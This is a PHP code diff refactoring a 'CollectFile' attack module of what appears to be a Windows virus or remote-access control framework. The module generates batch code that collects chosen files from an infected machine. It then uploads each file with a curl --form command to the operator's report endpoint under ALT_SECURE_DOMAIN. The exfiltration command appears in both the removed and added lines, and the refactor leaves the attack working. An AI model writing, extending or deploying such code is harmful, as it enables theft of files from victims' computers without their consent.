@@ -1,4 +1,4 @@
-<?php /** @noinspection PhpUnusedParameterInspection */
+<?php
 
 namespace Kelvinho\Virus\Attack\Packages\Windows\OneTime\CollectFile;
 
@@ -23,32 +23,11 @@ class CollectFile extends AttackBase {
     }
 
     public function setFileNames(string $fileNames): void {
-        $this->fileNames = filter(map(explode("\n", $fileNames), function ($element) {
-            return trim($element);
-        }), function ($element) {
-            return !empty($element);
-        });
+        $this->fileNames = filter(map(explode("\n", $fileNames), fn($element) => trim($element)), fn($element) => !empty($element));
     }
 
-    /** @noinspection PhpUnusedParameterInspection */
-
-    public function getEmptyFiles(): array {
-        return filter($this->fileNames, function ($element, $index) {
-            $file = DATA_FILE . "/attacks/$this->attack_id/file$index";
-            if (!file_exists($file)) return true;
-            return filesize($file) === 0;
-        }, null, false);
-    }
-
-    public function getNonEmptyFiles(): array {
-        return filter($this->fileNames, function ($element, $index) {
-            $file = DATA_FILE . "/attacks/$this->attack_id/file$index";
-            if (file_exists($file)) {
-                return filesize(DATA_FILE . "/attacks/$this->attack_id/file$index") !== 0;
-            } else {
-                return false;
-            }
-        }, null, false);
+    public function getFiles($empty) {
+        return array_values(filter($this->fileNames, fn($element, $index) => file_exists($file = DATA_DIR . "/attacks/$this->attack_id/file$index") ? (1 - $empty) - (filesize($file) === 0) : $empty));
     }
 
     public function generateBatchCode(): void {
@@ -70,10 +49,7 @@ class CollectFile extends AttackBase {
 
     private function generateUploadCode(): string {
         ob_start(); //@formatter:off ?>
-        curl --post301 --post302 --post303 -L <?php
-        for ($i = 0; $i < count($this->fileNames); $i++) {
-            echo "--form \"file$i=@%~pd0file$i\" ";
-        }
+        curl --post301 --post302 --post303 -L <?php for ($i = 0; $i < count($this->fileNames); $i++) echo "--form \"file$i=@%~pd0file$i\" ";
         echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report"; ?>
         <?php return ob_get_clean(); //@formatter:on
     }
